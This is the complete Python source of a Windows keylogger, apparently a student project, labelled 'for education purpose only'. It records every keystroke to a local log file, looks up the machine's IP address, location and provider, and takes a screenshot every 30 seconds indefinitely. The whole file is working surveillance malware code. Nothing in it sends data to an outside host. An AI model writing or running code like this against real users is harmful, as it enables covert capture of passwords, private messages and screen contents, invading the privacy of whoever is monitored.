
print("""
____  ____  ____  ____  ____  ____  ____  ____  ____   ____   ____   ____   ____   ____
                    _              _
                    | |            | |
                    | | _____ _   _| | ___   __ _  __ _  ___ _ __
                    | |/ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__| 
                    / |
                    |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
                               __/ |         __/ | __/ |
                              |___/         |___/ |___/
____  ____  ____  ____  ____  ____  ____  ____  ____   ____   ____   ____   ____   ____
--> Coded by: Wiktoria Pałczyńska
--> Github: https://github.com/WiktoriaPalczynska/ipp_Wiktoria_Palczynska_2023
--> For Windows System only

*For education purpose only! ;)
""")

import pynput
import socket
import requests
import pyautogui, os
import time
from pynput.keyboard import Key, Listener

count = 0
keys = []

def geolocation():
#IP address geolocation lookup is the identification of an IP address' geographic location in the real world.
#INFO: If you are using a VPN your real IP address has been converted to the address of the VPN server! 
    res = requests.get('https://ipinfo.io/')
    data = res.json()

    city = data['city']
    postal = data['postal']
    region = data['region']
    ip = data['ip']
    provider = data['org']
    location = data['loc']

    print("City: ", city)
    print("Postal: ", postal)
    print("Region: ", region)
    print("IP Adress: ", ip)
    print("Provider: ", provider)
    print("Geolocation ", location)

def captured():
#count how many characters were captured
    f = open('log.txt', "r")
    how = []
    for line in f:
        how_read = len(line)
        how.append(how_read)
    captured = sum(how)
    print("Captured: ", captured, "characters")

def screen():
#Create path for screens if not exists
    if not os.path.exists('screen'):
        os.makedirs('screen')

    #Take a screenshot every 30 second
    while True:
        screenshot = pyautogui.screenshot()
        #Generate filename based on current time
        timestamp = time.strftime("%Y%m%d%H%M%S", time.localtime())
        filename = f"screen/screenshot_{timestamp}.png"
        screenshot.save(filename)
        time.sleep(30)

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    #'count' updates the state of the keys and writes to text file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

#write to text file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#ends the program
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    geolocation()
    captured()
    screen()
